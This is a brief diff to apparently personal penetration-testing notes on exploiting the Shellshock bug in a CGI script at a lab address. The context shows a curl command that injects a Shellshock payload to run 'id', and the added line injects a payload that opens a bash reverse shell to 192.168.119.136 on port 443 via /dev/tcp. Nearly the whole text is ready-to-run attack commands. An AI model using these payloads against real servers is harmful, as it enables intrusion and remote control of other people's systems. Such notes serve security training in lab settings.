@@ -621,6 +621,9 @@ vrfy banzai
 PHP 5.* is on and CGI.bin is 200 we can shellshock
 https://www.sevenlayers.com/index.php/125-exploiting-shellshock
 curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.11.1.71/cgi-bin/admin.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.136/443 0>&1 2>&1' http://10.11.1.71/cgi-bin/admin.cgi
+
+
 
 ```
 # MYSQL version 5
